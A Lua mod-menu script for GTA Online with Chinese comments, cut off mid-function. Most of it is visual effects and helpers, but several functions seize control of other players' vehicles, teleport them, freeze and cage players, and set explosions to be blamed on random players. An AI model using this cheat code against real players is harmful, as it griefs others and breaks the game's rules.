





--传送载具
function request_control_once(entity)
	if not NETWORK.NETWORK_IS_IN_SESSION() then
		return true
	end
	local netId = NETWORK.NETWORK_GET_NETWORK_ID_FROM_ENTITY(entity)
	NETWORK.SET_NETWORK_ID_CAN_MIGRATE(netId, true)
	return NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(entity)
end

function request_control(entity, timeOut)
	if not ENTITY.DOES_ENTITY_EXIST(entity) then
		return false
	end
	timeOut = timeOut or 500
	local start = newTimer()
	while not request_control_once(entity) and start.elapsed() < timeOut do
		util.yield_once()
	end
	return start.elapsed() < timeOut
end

function tp_player_vehicle(player, pos)
		local targetPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player)
		if not PED.IS_PED_IN_ANY_VEHICLE(targetPed, false) then
			return
		end
		local vehicle = PED.GET_VEHICLE_PED_IS_IN(targetPed, false)
		if not ENTITY.DOES_ENTITY_EXIST(vehicle) or ENTITY.IS_ENTITY_DEAD(vehicle, false) or
		not VEHICLE.IS_VEHICLE_DRIVEABLE(vehicle, false) then
			-- nothing
		elseif request_control(vehicle, 1000) then
			ENTITY.SET_ENTITY_COORDS(vehicle, pos.x,pos.y,pos.z, false, false, false, false)
		else
			notification("未能获取载具控制权")
		end
	end
--烟花
function request_anim_dict(dict)
    while not STREAMING.HAS_ANIM_DICT_LOADED(dict) do
        STREAMING.REQUEST_ANIM_DICT(dict)
        util.yield()
    end
end
function request_ptfx_asset(asset)
    local request_time = os.time()
    STREAMING.REQUEST_NAMED_PTFX_ASSET(asset)
    while not STREAMING.HAS_NAMED_PTFX_ASSET_LOADED(asset) do
        if os.time() - request_time >= 10 then
            break
        end
        util.yield()
    end
end
--粒子特效
Effect = {asset = "", name = "", scale = 1.0}
Effect.__index = Effect

function Effect.new(asset, name, scale)
	local inst = setmetatable({}, Effect)
	inst.name = name
	inst.asset = asset
	inst.scale = scale
	return inst
end
effect  = Effect.new("scr_rcpaparazzo1", "scr_mich4_firework_sparkle_spawn")
effects = {}

function removeFxs(effects)
	for _, effect in ipairs(effects) do
		GRAPHICS.STOP_PARTICLE_FX_LOOPED(effect, 0)
		GRAPHICS.REMOVE_PARTICLE_FX(effect, 0)
	end
end
--轨迹
bones  = {
	0x49D9,	-- left hand
	0xDEAD,	-- right hand
	0x3779,	-- left foot
	0xCC4D	-- right foot
}
function newTimer()
	local self = {start = util.current_time_millis()}
	local function reset()
		self.start = util.current_time_millis()
	end
	local function elapsed()
		return util.current_time_millis() - self.start
	end
	return
	{
		reset = reset,
		elapsed = elapsed
	}
end
--火焰翅膀设置
local new = {}
function new.colour(R, G, B, A)
    return {r = R / 255, g = G / 255, b = B / 255, a = A or 1}
end
mildOrangeFire = new.colour( 255, 127, 80 )
fireWings = {
    [1] = {pos = {[1] = 120, [2] =  75}},
    [2] = {pos = {[1] = 120, [2] = -75}},
    [3] = {pos = {[1] = 135, [2] =  75}},
    [4] = {pos = {[1] = 135, [2] = -75}},
    [5] = {pos = {[1] = 180, [2] =  75}},
    [6] = {pos = {[1] = 180, [2] = -75}},
    [7] = {pos = {[1] = 195, [2] =  75}},
    [8] = {pos = {[1] = 195, [2] = -75}},
}
fireWingsSettings = {
    scale = 0.3,
    colour = mildOrangeFire,
    on = false
}
        bigfireWings = {
            [1] = {pos = {[1] = 120, [2] =  75}},
            [2] = {pos = {[1] = 120, [2] = -75}},
            [3] = {pos = {[1] = 135, [2] =  75}},
            [4] = {pos = {[1] = 135, [2] = -75}},
            [5] = {pos = {[1] = 180, [2] =  75}},
            [6] = {pos = {[1] = 180, [2] = -75}},
            [7] = {pos = {[1] = 190, [2] =  75}},
            [8] = {pos = {[1] = 190, [2] = -75}},
			[9] = {pos = {[1] = 130, [2] =  75}},
            [10] = {pos = {[1] = 130, [2] = -75}},
			[11] = {pos = {[1] = 140, [2] =  75}},
            [12] = {pos = {[1] = 140, [2] = -75}},
			[13] = {pos = {[1] = 150, [2] =  75}},
            [14] = {pos = {[1] = 150, [2] = -75}},
			[15] = {pos = {[1] = 210, [2] =  75}},
            [16] = {pos = {[1] = 210, [2] = -75}},
			[17] = {pos = {[1] = 195, [2] =  75}},
            [18] = {pos = {[1] = 195, [2] = -75}},
			[19] = {pos = {[1] = 160, [2] =  75}},
            [20] = {pos = {[1] = 160, [2] = -75}},
			[21] = {pos = {[1] = 170, [2] =  75}},
            [22] = {pos = {[1] = 170, [2] = -75}},
			[23] = {pos = {[1] = 200, [2] =  75}},
            [24] = {pos = {[1] = 200, [2] = -75}},
        }
function loadModel(hash)
    STREAMING.REQUEST_MODEL(hash)
    while not STREAMING.HAS_MODEL_LOADED(hash) do util.yield() end
end
----保镖选项
function Create_Network_Ped(pedType, modelHash, x, y, z, heading)
    Request_Model(modelHash)
    local ped = PED.CREATE_PED(pedType, modelHash, x, y, z, heading, true, true)

    ENTITY.SET_ENTITY_LOAD_COLLISION_FLAG(ped, true, 1)
    ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ped, true, false)
    ENTITY.SET_ENTITY_SHOULD_FREEZE_WAITING_ON_COLLISION(ped, true)

    NETWORK.NETWORK_REGISTER_ENTITY_AS_NETWORKED(ped)
    local net_id = NETWORK.PED_TO_NET(ped)
    NETWORK.SET_NETWORK_ID_EXISTS_ON_ALL_MACHINES(net_id, true)
    NETWORK.SET_NETWORK_ID_CAN_MIGRATE(net_id, true)
    for _, player in pairs(players.list(true, true, true)) do
        NETWORK.SET_NETWORK_ID_ALWAYS_EXISTS_FOR_PLAYER(net_id, player, true)
    end

    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(modelHash)
    return ped
end
function round(num, places)
    return tonumber(string.format('%.' .. (places or 0) .. 'f', num))
end
function add_blip_for_entity(entity, blipSprite, colour)
    local blip = HUD.ADD_BLIP_FOR_ENTITY(entity)
    HUD.SET_BLIP_SPRITE(blip, blipSprite)
    HUD.SET_BLIP_COLOUR(blip, colour)
    HUD.SHOW_HEIGHT_ON_BLIP(blip, false)

    util.create_tick_handler(function()
        if ENTITY.DOES_ENTITY_EXIST(entity) and not ENTITY.IS_ENTITY_DEAD(entity) then
            local heading = ENTITY.GET_ENTITY_HEADING(entity)
            HUD.SET_BLIP_ROTATION(blip, round(heading))
        elseif not HUD.DOES_BLIP_EXIST(blip) then
            return false
        else
            util.remove_blip(blip)
            return false
        end
    end)
    return blip
end



---传送实体到我
function SET_ENTITY_COORDS(entity, coords)
    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(entity, coords.x, coords.y, coords.z, true, false, false)
end
function TP_TO_ME(ent, offsetX, offsetY, offsetZ)
    if offsetX == nil then offsetX = 0.0 end
    if offsetY == nil then offsetY = 0.0 end
    if offsetZ == nil then offsetZ = 0.0 end
    local coords = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(players.user_ped(), offsetX, offsetY, offsetZ)
    SET_ENTITY_COORDS(ent, coords)
end
---要设置的实体，要朝向的实体，角度差
function SET_ENTITY_HEAD_TO_ENTITY(set_ent, to_ent, angle)
    if angle == nil then angle = 0.0 end
    local Head = ENTITY.GET_ENTITY_HEADING(to_ent)
    ENTITY.SET_ENTITY_HEADING(set_ent, Head + angle)
end
-- 武器
WeaponName_ListItem = {
    { "小刀" },
    { "穿甲手枪" },
    { "电击枪" },
    { "微型冲锋枪" },
    { "特质卡宾步枪" },
    { "突击霰弹枪" },
    { "火神机枪" },
    { "火箭筒" },
    { "电磁步枪" }
}
WeaponModel_List = {
    "WEAPON_KNIFE",
    "WEAPON_APPISTOL",
    "WEAPON_STUNGUN",
    "WEAPON_MICROSMG",
    "WEAPON_SPECIALCARBINE",
    "WEAPON_ASSAULTSHOTGUN",
    "WEAPON_MINIGUN",
    "WEAPON_RPG",
    "WEAPON_RAILGUN"
}
--彩虹颜色
local mcxh=1

local mcr=255

local mcg=0

local mcb=0
function rainbow_color()
        if mcxh==1 and mcg<256 then

            HUD.SET_TEXT_COLOUR(mcr, mcg, mcb, 255)	

            if mcg == 255 then

                mcxh=2

            else

                mcg=mcg+1

            end

        elseif mcxh==2 and mcr>-1 then

            HUD.SET_TEXT_COLOUR(mcr,mcg,mcb,255)

            if mcr == 0 then

                mcxh=3

            else

                mcr=mcr-1

            end

        elseif mcxh==3 and mcb<256 then

            HUD.SET_TEXT_COLOUR(mcr,mcg,mcb,255)

            if mcb == 255 then

                mcxh=4

            else

                mcb=mcb+1

            end

        elseif mcxh==4 and mcg>-1 then

            HUD.SET_TEXT_COLOUR(mcr,mcg,mcb,255)

            if mcg == 0 then

                mcxh=5

            else

                mcg=mcg-1

            end

        elseif mcxh==5 and mcr<256 then

            HUD.SET_TEXT_COLOUR(mcr,mcg,mcb,255)

            if mcr == 255 then

                mcxh=6

            else

                mcr=mcr+1

            end

        elseif mcxh==6 and mcb>-1 then

            HUD.SET_TEXT_COLOUR(mcr,mcg,mcb,255)

            if mcb == 0 then

                mcxh=1

            else

                mcb=mcb-1

            end

        end
end
--给予载具附加
		function give_car_addon(pid, hash, center, ang)
    local car = PED.GET_VEHICLE_PED_IS_IN(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), true)
    local pos = ENTITY.GET_ENTITY_COORDS(car, true)
    pos.x = pos['x']
    pos.y = pos['y']
    pos.z = pos['z']
    request_model_load(hash)
    local ramp = OBJECT.CREATE_OBJECT_NO_OFFSET(hash, pos['x'], pos['y'], pos['z'], true, false, false)
    local size = get_model_size(ENTITY.GET_ENTITY_MODEL(car))
    if center then
        ENTITY.ATTACH_ENTITY_TO_ENTITY(ramp, car, 0, 0.0, 0.0, 0.0, 0.0, 0.0, ang, true, true, true, false, 0, true)
    else
        ENTITY.ATTACH_ENTITY_TO_ENTITY(ramp, car, 0, 0.0, size['y']+1.0, 0.0, 0.0, 0.0, ang, true, true, true, false, 0, true)
    end
end
--获取模型尺寸
function get_model_size(hash)
    local minptr = memory.alloc(24)
    local maxptr = memory.alloc(24)
    MISC.GET_MODEL_DIMENSIONS(hash, minptr, maxptr)
    min = memory.read_vector3(minptr)
    max = memory.read_vector3(maxptr)
    local size = {}
    size['x'] = max['x'] - min['x']
    size['y'] = max['y'] - min['y']
    size['z'] = max['z'] - min['z']
    size['max'] = math.max(size['x'], size['y'], size['z'])

    memory.free(minptr)
    memory.free(maxptr)

    return size
end
--控制载具
function control_vehicle(pid, callback, opts)
    local vehicle = get_player_vehicle_in_control(pid, opts)
    if vehicle > 0 then
        callback(vehicle)
    elseif opts == nil or opts.silent ~= true then
        notification("玩家不在车内或不在范围内.")
    end
end
--获取玩家载具控制
function get_player_vehicle_in_control(pid, opts)
    local my_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()) -- Needed to turn off spectating while getting control
    local target_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)

    -- Calculate how far away from target
    local pos1 = ENTITY.GET_ENTITY_COORDS(target_ped)
    local pos2 = ENTITY.GET_ENTITY_COORDS(my_ped)
    local dist = SYSTEM.VDIST2(pos1.x, pos1.y, 0, pos2.x, pos2.y, 0)

    local was_spectating = NETWORK.NETWORK_IS_IN_SPECTATOR_MODE() -- Needed to toggle it back on if currently spectating
    -- If they out of range (value may need tweaking), auto spectate.
    local vehicle = PED.GET_VEHICLE_PED_IS_IN(target_ped, true)
    if opts and opts.near_only and vehicle == 0 then
        return 0
    end
    if vehicle == 0 and target_ped ~= my_ped and dist > 340000 and not was_spectating then
        i18n.toast("AUTO_SPECTATE")
        show_busyspinner(i18n.format("AUTO_SPECTATE"))
        NETWORK.NETWORK_SET_IN_SPECTATOR_MODE(true, target_ped)
        -- To prevent a hard 3s loop, we keep waiting upto 3s or until vehicle is acquired
        local loop = (opts and opts.loops ~= nil) and opts.loops or 30 -- 3000 / 100
        while vehicle == 0 and loop > 0 do
            util.yield(100)
            vehicle = PED.GET_VEHICLE_PED_IS_IN(target_ped, true)
            loop = loop - 1
        end
        HUD.BUSYSPINNER_OFF()
    end

    if vehicle > 0 then
        if NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(vehicle) then
            return vehicle
        end
        -- Loop until we get control
        local netid = NETWORK.NETWORK_GET_NETWORK_ID_FROM_ENTITY(vehicle)
        local has_control_ent = false
        local loops = 15
        NETWORK.SET_NETWORK_ID_CAN_MIGRATE(netid, true)

        -- Attempts 15 times, with 8ms per attempt
        while not has_control_ent do
            has_control_ent = NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle)
            loops = loops - 1
            -- wait for control
            util.yield(15)
            if loops <= 0 then
                break
            end
        end
    end
    if not was_spectating then
        NETWORK.NETWORK_SET_IN_SPECTATOR_MODE(false, target_ped)
    end
    return vehicle
end
--好友列表
function get_friend_count()

    native_invoker.begin_call();native_invoker.end_call("203F1CFD823B27A4");

    return native_invoker.get_return_value_int();

end

function get_frined_name(friendIndex)

    native_invoker.begin_call();native_invoker.push_arg_int(friendIndex);native_invoker.end_call("4164F227D052E293");return native_invoker.get_return_value_string();

end
--瞄准惩罚

function crashPlayer(ped, loop, expSettings)
	   
		local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local pos = ENTITY.GET_ENTITY_COORDS(ped)

        local blamedPlayer = PLAYER.PLAYER_PED_ID()
        if expSettings.blamedPlayer and expSettings.blamed then
            blamedPlayer = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(expSettings.blamedPlayer)
        elseif expSettings.blamed then
            local playerList = players.list(true, true, true)
            blamedPlayer = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(playerList[math.random(1, #playerList)])
        end
		if PED.IS_PED_IN_ANY_VEHICLE(player_ped, false) then
			menu.trigger_commands("freeze"..PLAYER.GET_PLAYER_NAME(pid).." on")
			util.yield(300)
			if PED.IS_PED_IN_ANY_VEHICLE(player_ped, false) then
				notification("未能将玩家踢出载具")
				menu.trigger_commands("freeze"..PLAYER.GET_PLAYER_NAME(pid).." off")
				return
			end
			menu.trigger_commands("freeze"..PLAYER.GET_PLAYER_NAME(pid).." off")
			pos =  ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)) 
		end
		cage_player(pos)
    end
            local whitelistGroups = {user = true, friends = true, strangers  = true}
            local whitelistListTable = {}
            local whitelistedName = false
                function getNonWhitelistedPlayers(whitelistListTable, whitelistGroups, whitelistedName)
                    local playerList = players.list(whitelistGroups.user, whitelistGroups.friends, whitelistGroups.strangers)
                    local notWhitelisted = {}
                    for i = 1, #playerList do
                        if not whitelistListTable[playerList[i]] and not (players.get_name(playerList[i]) == whitelistedName) then
                            notWhitelisted[#notWhitelisted + 1] = playerList[i]
                        end
                    end
                    return notWhitelisted
                end
expSettings = {
                camShake = 0, invisible = false, audible = true, noDamage = false, owned = false, blamed = false, blamedPlayer = false, expType = 0,
                colour = new.colour( 255, 0, 255 )
            }

            karma = {}
        function playerIsTargetingEntity(playerPed)
            local playerList = getNonWhitelistedPlayers(whitelistListTable, whitelistGroups, whitelistedName)
            for k, playerPid in pairs(playerList) do
                if PLAYER.IS_PLAYER_TARGETTING_ENTITY(playerPid, playerPed) or PLAYER.IS_PLAYER_FREE_AIMING_AT_ENTITY(playerPid, playerPed) then
                    karma[playerPed] = {
                        pid = playerPid,
                        ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(playerPid)
                    }
                    return true
                end
            end
            karma[playerPed] = nil
            return false
        end

function heezyPlayer(ped, loop, expSettings)
local TTPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
local TTPos = ENTITY.GET_ENTITY_COORDS(TTPed, true)
        local spped = PLAYER.PLAYER_PED_ID()
        local SelfPlayerPos = ENTITY.GET_ENTITY_COORDS(spped, true)
        SelfPlayerPos.x = SelfPlayerPos.x + 10
        TTPos.x = TTPos.x + 10
        local carc = CreateObject(util.joaat("apa_prop_flag_china"), TTPos, ENTITY.GET_ENTITY_HEADING(spped), true)
        local carcPos = ENTITY.GET_ENTITY_COORDS(vehicle, true)
        local pedc = CreatePed(26, util.joaat("A_C_HEN"), TTPos, 0)
        local pedcPos = ENTITY.GET_ENTITY_COORDS(vehicle, true)
        local ropec = PHYSICS.ADD_ROPE(TTPos.x, TTPos.y, TTPos.z, 0, 0, 0, 1, 1, 0.00300000000000000000000000000000000000000000000001, 1, 1, true, true, true, 1.0, true, 0)
        PHYSICS.ATTACH_ENTITIES_TO_ROPE(ropec,carc,pedc,carcPos.x, carcPos.y, carcPos.z ,pedcPos.x, pedcPos.y, pedcPos.z,2, false, false, 0, 0, "Center","Center")
        util.yield(3500)
        PHYSICS.DELETE_CHILD_ROPE(ropec)
		entities.delete_by_handle(pedc)
    end

--火人
burning_man_ptfx_asset = "core"
burning_man_ptfx_effect = "fire_wrecked_plane_cockpit"
request_ptfx_asset(burning_man_ptfx_asset)
local trail_bones = {0xffa, 0xfa11, 0x83c, 0x512d, 0x796e, 0xb3fe, 0x3fcf, 0x58b7, 0xbb0}
looped_ptfxs = {}
local was_burning_man_on = false

function fireman()
        request_ptfx_asset(burning_man_ptfx_asset)
GRAPHICS.USE_PARTICLE_FX_ASSET(burning_man_ptfx_asset)  
        for _, bone in pairs(trail_bones) do
GRAPHICS.USE_PARTICLE_FX_ASSET(burning_man_ptfx_asset)
            local bone_id = PED.GET_PED_BONE_INDEX(players.user_ped(), bone)
            fx = GRAPHICS.START_NETWORKED_PARTICLE_FX_LOOPED_ON_ENTITY_BONE(burning_man_ptfx_effect, players.user_ped(), 0.0, 0.0, 0.0, 0.0, 0.0, 90.0, bone_id, 0.5, false, false, false, 0, 0, 0, 0)
            looped_ptfxs[#looped_ptfxs+1] = fx
            GRAPHICS.SET_PARTICLE_FX_LOOPED_COLOUR(fx, 100, 100, 100, false)
        end
    end
--伤害数字
b_drawing_funcs = {}
b_drawing_funcs.new = function ()
    local self = {}
    self.draw_arrow = function(pos, angle, size, colour_a, colour_b)
        local angle_cos = math.cos(angle)
        local angle_sin = math.sin(angle)
    
        local width = 0.5 * size
        local length = 1 * size
        local height = 0.25 * size
    
        GRAPHICS.DRAW_POLY(
            pos.x + (angle_cos * -width - angle_sin * -length),
            pos.y + (angle_sin * -width + angle_cos * -length),
            pos.z + 0,
            pos.x + (angle_cos * 0 - angle_sin * -width),
            pos.y + (angle_sin * 0 + angle_cos * -width),
            pos.z + -height,
            pos.x + (angle_cos * 0 - angle_sin * -width),
            pos.y + (angle_sin * 0 + angle_cos * -width),
            pos.z + height,
            colour_b.r,
            colour_b.g,
            colour_b.b,
            colour_b.a
        )
        GRAPHICS.DRAW_POLY(
            pos.x + (angle_cos * 0 - angle_sin * -width),
            pos.y + (angle_sin * 0 + angle_cos * -width),
            pos.z + -height,
            pos.x + (angle_cos * width - angle_sin * -length),
            pos.y + (angle_sin * width + angle_cos * -length),
            pos.z + 0,
            pos.x + (angle_cos * 0 - angle_sin * -width),
            pos.y + (angle_sin * 0 + angle_cos * -width),
            pos.z + height,
            colour_a.r,
            colour_a.g,
            colour_a.b,
            colour_a.a
        )
        GRAPHICS.DRAW_POLY(
            pos.x + (angle_cos * width - angle_sin * -length),
            pos.y + (angle_sin * width + angle_cos * -length),
            pos.z + 0,
            pos.x + (angle_cos * 0 - angle_sin * width),
            pos.y + (angle_sin * 0 + angle_cos * width),
            pos.z + 0,
            pos.x + (angle_cos * 0 - angle_sin * -width),
            pos.y + (angle_sin * 0 + angle_cos * -width),
            pos.z + height,
            colour_a.r,
            colour_a.g,
            colour_a.b,
            colour_a.a
        )
        GRAPHICS.DRAW_POLY(
            pos.x + (angle_cos * 0 - angle_sin * width),
            pos.y + (angle_sin * 0 + angle_cos * width),
            pos.z + 0,
            pos.x + (angle_cos * width - angle_sin * -length),
            pos.y + (angle_sin * width + angle_cos * -length),
            pos.z + 0,
            pos.x + (angle_cos * 0 - angle_sin * -width),
            pos.y + (angle_sin * 0 + angle_cos * -width),
            pos.z + -height,
            colour_a.r,
            colour_a.g,
            colour_a.b,
            colour_a.a
        )
        GRAPHICS.DRAW_POLY(
            pos.x + (angle_cos * -width - angle_sin * -length),
            pos.y + (angle_sin * -width + angle_cos * -length),
            pos.z + 0,
            pos.x + (angle_cos * 0 - angle_sin * width),
            pos.y + (angle_sin * 0 + angle_cos * width),
            pos.z + 0,
            pos.x + (angle_cos * 0 - angle_sin * -width),
            pos.y + (angle_sin * 0 + angle_cos * -width),
            pos.z + -height,
            colour_b.r,
            colour_b.g,
            colour_b.b,
            colour_b.a
        )
        GRAPHICS.DRAW_POLY(
            pos.x + (angle_cos * 0 - angle_sin * width),
            pos.y + (angle_sin * 0 + angle_cos * width),
            pos.z + 0,
            pos.x + (angle_cos * -width - angle_sin * -length),
            pos.y + (angle_sin * -width + angle_cos * -length),
            pos.z + 0,
            pos.x + (angle_cos * 0 - angle_sin * -width),
            pos.y + (angle_sin * 0 + angle_cos * -width),
            pos.z + height,
            colour_b.r,
            colour_b.g,
            colour_b.b,
            colour_b.a
        )
    end
    self.draw_arrow_down = function(pos, angle, size, colour_a, colour_b)
        local angle_cos = math.cos(angle)
        local angle_sin = math.sin(angle)
    
        local width = 0.5 * size
        local length = 1 * size
        local height = 0.25 * size
        
        GRAPHICS.DRAW_POLY(
            pos.x + (angle_cos * 0 - angle_sin * 0),
            pos.y + (angle_sin * 0 + angle_cos * 0),
            pos.z + 0,
            pos.x + (angle_cos * 0 - angle_sin * height),
            pos.y + (angle_sin * 0 + angle_cos * height),
            pos.z + length + height,
            pos.x + (angle_cos * width - angle_sin * 0),
            pos.y + (angle_sin * width + angle_cos * 0),
            pos.z + length,
            colour_b.r,
            colour_b.g,
            colour_b.b,
            colour_b.a
        )
        GRAPHICS.DRAW_POLY(
            pos.x + (angle_cos * 0 - angle_sin * -height),
            pos.y + (angle_sin * 0 + angle_cos * -height),
            pos.z + length + height,
            pos.x + (angle_cos * 0 - angle_sin * 0),
            pos.y + (angle_sin * 0 + angle_cos * 0),
            pos.z + 0,
            pos.x + (angle_cos * width - angle_sin * 0),
            pos.y + (angle_sin * width + angle_cos * 0),
            pos.z + length,
            colour_b.r,
            colour_b.g,
            colour_b.b,
            colour_b.a
        )
        GRAPHICS.DRAW_POLY(
            pos.x + (angle_cos * 0 - angle_sin * 0),
            pos.y + (angle_sin * 0 + angle_cos * 0),
            pos.z + 0,
            pos.x + (angle_cos * 0 - angle_sin * -height),
            pos.y + (angle_sin * 0 + angle_cos * -height),
            pos.z + length + height,
            pos.x + (angle_cos * -width - angle_sin * 0),
            pos.y + (angle_sin * -width + angle_cos * 0),
            pos.z + length,
            colour_a.r,
            colour_a.g,
            colour_a.b,
            colour_a.a
        )
        GRAPHICS.DRAW_POLY(
            pos.x + (angle_cos * 0 - angle_sin * height),
            pos.y + (angle_sin * 0 + angle_cos * height),
            pos.z + length + height,
            pos.x + (angle_cos * 0 - angle_sin * 0),
            pos.y + (angle_sin * 0 + angle_cos * 0),
            pos.z + 0,
            pos.x + (angle_cos * -width - angle_sin * 0),
            pos.y + (angle_sin * -width + angle_cos * 0),
            pos.z + length,
            colour_a.r,
            colour_a.g,
            colour_a.b,
            colour_a.a
        )
        GRAPHICS.DRAW_POLY(
            pos.x + (angle_cos * 0 - angle_sin * height),
            pos.y + (angle_sin * 0 + angle_cos * height),
            pos.z + length + height,
            pos.x + (angle_cos * 0 - angle_sin * -height),
            pos.y + (angle_sin * 0 + angle_cos * -height),
            pos.z + length + height,
            pos.x + (angle_cos * width - angle_sin * 0),
            pos.y + (angle_sin * width + angle_cos * 0),
            pos.z + length,
            colour_b.r,
            colour_b.g,
            colour_b.b,
            colour_b.a
        )
        GRAPHICS.DRAW_POLY(
            pos.x + (angle_cos * 0 - angle_sin * -height),
            pos.y + (angle_sin * 0 + angle_cos * -height),
            pos.z + length + height,
            pos.x + (angle_cos * 0 - angle_sin * height),
            pos.y + (angle_sin * 0 + angle_cos * height),
            pos.z + length + height,
            pos.x + (angle_cos * -width - angle_sin * 0),
            pos.y + (angle_sin * -width + angle_cos * 0),
            pos.z + length,
            colour_a.r,
            colour_a.g,
            colour_a.b,
            colour_a.a
        )
    end
    self.draw_quad = function (pos1_org, pos2_org, size, colour_a, colour_b, dict, texture)
        GRAPHICS.REQUEST_STREAMED_TEXTURE_DICT(dict, false)
        if GRAPHICS.HAS_STREAMED_TEXTURE_DICT_LOADED(dict) then
            pos1 =  {x = pos1_org.x, y = pos1_org.y, z = pos1_org.z}
            pos2 =  {x = pos2_org.x, y = pos2_org.y, z = pos2_org.z}
            pos2.z = pos2.z - size * 0.5
            pos1.z = pos1.z - size * 0.5
            GRAPHICS.SET_BACKFACECULLING(false)
            GRAPHICS._DRAW_SPRITE_POLY_2(
                pos1.x,     pos1.y,             pos1.z,
                pos2.x,     pos2.y,             pos2.z,
                pos2.x,     pos2.y,             pos2.z + size,
                colour_b.r, colour_b.g, colour_b.b, colour_b.a,
                colour_b.r, colour_b.g, colour_b.b, colour_b.a,
                colour_b.r, colour_b.g, colour_b.b, colour_b.a,
                dict,
                texture,
                0, 1, 0, 
                1, 1, 0,
                0, 0, 0
            )
              GRAPHICS._DRAW_SPRITE_POLY_2(
                pos1.x,     pos1.y,             pos1.z + size,
                pos1.x,     pos1.y,             pos1.z,
                pos2.x,     pos2.y,             pos2.z + size,
                colour_a.r, colour_a.g, colour_a.b, colour_a.a,
                colour_a.r, colour_a.g, colour_a.b, colour_a.a,
                colour_a.r, colour_a.g, colour_a.b, colour_a.a,
                dict,
                texture,
                0, 0, 0,
                1, 1, 0,
                1, 0, 0
            )
        else
            notification("not loaded")
        end 
    end
    self.arc_line = {}
    self.arc_line.new = function ()
        arc = {}
        arc.instability = 0.75
        arc.draw = function (pos1, pos2)
            local dif = {x = pos2.x - pos1.x, y = pos2.y - pos1.y, z = pos2.z - pos1.z}
            local distance_to_cover = math.sqrt(
                (dif.x * dif.x) +
                (dif.y * dif.y) +
                (dif.z * dif.z)
            )
            local nor_dir = {x = dif.x / distance_to_cover, y = dif.y / distance_to_cover,z = dif.z / distance_to_cover}

            for _ = 0, 3, 1 do
                local distance_covered = math.random() * 1.5
                local previous_pos = pos1
                repeat
                    local current_pos = {
                        x = pos1.x + nor_dir.x * distance_covered + (math.random() - 0.5) * arc.instability,
                        y = pos1.y + nor_dir.y * distance_covered + (math.random() - 0.5) * arc.instability,
                        z = pos1.z + nor_dir.z * distance_covered + (math.random() - 0.5) * arc.instability
                    }
                    GRAPHICS.DRAW_LINE(
                        previous_pos.x, previous_pos.y, previous_pos.z,
                        current_pos.x , current_pos.y , current_pos.z,
                        0, 255, 255, 255
                    )
                    previous_pos = current_pos
                    distance_covered = distance_covered + math.random() * 1.5
                until distance_covered > distance_to_cover
                GRAPHICS.DRAW_LINE(
                    previous_pos.x, previous_pos.y, previous_pos.z,
                    pos2.x , pos2.y , pos2.z,
                    0, 255, 255, 255
                )
            end

            arc.instability = arc.instability + (0.15 - arc.instability) *  MISC.GET_FRAME_TIME() * 7
        end
        return arc
    end
    local minimum = memory.alloc()
    local maximum = memory.alloc()
    local upVector_pointer = memory.alloc()
    local rightVector_pointer = memory.alloc()
    local forwardVector_pointer = memory.alloc()
    local position_pointer = memory.alloc()
    self.draw_bounding_box = function (entity, colour)
        ENTITY.GET_ENTITY_MATRIX(entity, rightVector_pointer, forwardVector_pointer, upVector_pointer, position_pointer);
        local forward_vector = memory.read_vector3(forwardVector_pointer)
        local right_vector = memory.read_vector3(rightVector_pointer)
        local up_vector = memory.read_vector3(upVector_pointer)

        MISC.GET_MODEL_DIMENSIONS(ENTITY.GET_ENTITY_MODEL(entity), minimum, maximum)
        local minimum_vec = memory.read_vector3(minimum)
        local maximum_vec = memory.read_vector3(maximum)
        local dimensions = {x = maximum_vec.y - minimum_vec.y, y = maximum_vec.x - minimum_vec.x, z = maximum_vec.z - minimum_vec.z}

        local top_right =           ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(entity,       maximum_vec.x, maximum_vec.y, maximum_vec.z)
        local top_right_back =      {x = forward_vector.x * -dimensions.y + top_right.x,        y = forward_vector.y * -dimensions.y + top_right.y,         z = forward_vector.z * -dimensions.y + top_right.z}
        local bottom_right_back =   {x = up_vector.x * -dimensions.z + top_right_back.x,        y = up_vector.y * -dimensions.z + top_right_back.y,         z = up_vector.z * -dimensions.z + top_right_back.z}
        local bottom_left_back =    {x = -right_vector.x * dimensions.x + bottom_right_back.x,  y = -right_vector.y * dimensions.x + bottom_right_back.y,   z = -right_vector.z * dimensions.x + bottom_right_back.z}
        local top_left =            {x = -right_vector.x * dimensions.x + top_right.x,          y = -right_vector.y * dimensions.x + top_right.y,           z = -right_vector.z * dimensions.x + top_right.z}
        local bottom_right =        {x = -up_vector.x * dimensions.z + top_right.x,             y = -up_vector.y * dimensions.z + top_right.y,              z = -up_vector.z * dimensions.z + top_right.z}
        local bottom_left =         {x = forward_vector.x * dimensions.y + bottom_left_back.x,  y = forward_vector.y * dimensions.y + bottom_left_back.y,   z = forward_vector.z * dimensions.y + bottom_left_back.z}
        local top_left_back =       {x = up_vector.x * dimensions.z + bottom_left_back.x,       y = up_vector.y * dimensions.z + bottom_left_back.y,        z = up_vector.z * dimensions.z + bottom_left_back.z}

        GRAPHICS.DRAW_LINE(
            top_right.x, top_right.y, top_right.z,
            top_right_back.x, top_right_back.y, top_right_back.z,
           colour.r, colour.g, colour.b, colour.a
        )
        GRAPHICS.DRAW_LINE(
            top_right.x, top_right.y, top_right.z,
            top_left.x, top_left.y, top_left.z,
           colour.r, colour.g, colour.b, colour.a
        )
        GRAPHICS.DRAW_LINE(
            top_right.x, top_right.y, top_right.z,
            bottom_right.x, bottom_right.y, bottom_right.z,
           colour.r, colour.g, colour.b, colour.a
        )
        GRAPHICS.DRAW_LINE(
